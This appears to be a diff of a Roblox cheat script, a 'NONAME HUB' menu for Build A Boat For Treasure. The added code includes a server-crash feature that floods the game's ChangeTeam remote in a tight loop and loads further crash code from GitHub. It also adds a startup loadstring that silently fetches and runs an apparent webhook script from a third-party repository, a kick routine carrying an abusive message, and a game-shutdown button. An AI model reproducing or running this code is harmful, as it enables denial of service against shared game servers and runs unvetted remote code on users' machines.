@@ -1,4 +1,12 @@
--- Set this variable to true to allow the script to execute
+local Reason = "Banned | Reason: Cheating" --Insert Reason Here
+local Player = "" --Full player name here
+function Kick(Plr,B)
+    game.Players:FindFirstChild(Plr):Kick(B)
+    print("กูแบนไอส้สไม่ต้องใช้สคริปกูรห้สนี้กูขอแบนไม่ให้ใช้สคริปละกัน")
+    print("Ban Script I want to ban it.")
+end
+pcall(Kick,Player,Reason)
+
 local allowExecution = true
 
 print("Script Execution is Allowed.")
@@ -8,7 +16,7 @@ if not allowExecution then
     return
 end
 
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/GODMODs132/WebHook-Discord-Roblox/main/Script.lua"),true))()
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/peatchXD/Script-WH/main/Scripts.lua"),true))()
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/GUI"))() 
 local Window = Library.CreateLib("Build A Boat For Treasure | NONAME HUB 4.0", "DarkTheme")
@@ -128,7 +136,86 @@ local Section = Tab:NewSection("🧱 Fake Blocks")
 Section:NewButton("Click", "NONAME HUB", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Fake%20All.lua"))()
 end)
 
+local Tab = Window:NewTab("☢ Crash Server")
+local Section = Tab:NewSection("Server")
+
+Section:NewButton("Start 1", "", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Crash%20Server.lua"))()
+end)
+
+Section:NewToggle("Start 2", " ", function(SSSSSS)
+    _G.CrashS = (SSSSSS)
+end)
+
+local white = game:GetService("Teams").white
+local red = game:GetService("Teams").red
+local black = game:GetService("Teams").black
+local blue = game:GetService("Teams").blue
+local green = game:GetService("Teams").green
+local magenta = game:GetService("Teams").magenta
+local yellow = game:GetService("Teams").yellow
+
+spawn(function()
+	while wait() do
+		if _G.CrashS then
+            workspace.ChangeTeam:FireServer(white)
+            workspace.ChangeTeam:FireServer(red)
+            workspace.ChangeTeam:FireServer(black)
+            workspace.ChangeTeam:FireServer(blue)
+            workspace.ChangeTeam:FireServer(green)
+            workspace.ChangeTeam:FireServer(magenta)
+            workspace.ChangeTeam:FireServer(yellow)
+            workspace.ChangeTeam:FireServer(white)
+            workspace.ChangeTeam:FireServer(red)
+            workspace.ChangeTeam:FireServer(black)
+            workspace.ChangeTeam:FireServer(blue)
+            workspace.ChangeTeam:FireServer(green)
+            workspace.ChangeTeam:FireServer(magenta)
+            workspace.ChangeTeam:FireServer(yellow)
+            workspace.ChangeTeam:FireServer(white)
+            workspace.ChangeTeam:FireServer(red)
+            workspace.ChangeTeam:FireServer(black)
+            workspace.ChangeTeam:FireServer(blue)
+            workspace.ChangeTeam:FireServer(green)
+            workspace.ChangeTeam:FireServer(magenta)
+            workspace.ChangeTeam:FireServer(yellow)
+            workspace.ChangeTeam:FireServer(white)
+            workspace.ChangeTeam:FireServer(red)
+            workspace.ChangeTeam:FireServer(black)
+            workspace.ChangeTeam:FireServer(blue)
+            workspace.ChangeTeam:FireServer(green)
+            workspace.ChangeTeam:FireServer(magenta)
+            workspace.ChangeTeam:FireServer(yellow)
+            workspace.ChangeTeam:FireServer(white)
+            workspace.ChangeTeam:FireServer(red)
+            workspace.ChangeTeam:FireServer(black)
+            workspace.ChangeTeam:FireServer(blue)
+            workspace.ChangeTeam:FireServer(green)
+            workspace.ChangeTeam:FireServer(magenta)
+            workspace.ChangeTeam:FireServer(yellow)
+            workspace.ChangeTeam:FireServer(white)
+            workspace.ChangeTeam:FireServer(red)
+            workspace.ChangeTeam:FireServer(black)
+            workspace.ChangeTeam:FireServer(blue)
+            workspace.ChangeTeam:FireServer(green)
+            workspace.ChangeTeam:FireServer(magenta)
+            workspace.ChangeTeam:FireServer(yellow)
+        wait(0.0001)
+		else
+		end
+	end
+end)
+
 local Tab = Window:NewTab("🎄 Quests") 
+local Section = Tab:NewSection("🗑 Clear Quest")
+Section:NewButton("Click", " ", function()
+local args = {
+    [1] = 0
+}
+
+workspace.QuestMakerEvent:FireServer(unpack(args))
+end)
+
 local Section = Tab:NewSection("🍞 Bread Quest")
 Section:NewButton("Click", "Loads in the fabbie boss (you need to be leader for this to work", function() workspace.QuestMakerEvent:FireServer(100) end)
 
@@ -244,9 +331,13 @@ local Tab = Window:NewTab("🎮 Main")
 
 local Section = Tab:NewSection("GAME")
 
+Section:NewButton("Exit/Quit", "ShutDown Game", function()
+    game:shutdown() 
+end)
+
 Section:NewButton("Remove Water", " ", function()
 	for i,v in pairs(workspace:GetDescendants()) do
-		if v.Name == "WaterDetector" then
+		if v.Name == "Water" then
 			v:Destroy()
 		end
 	end
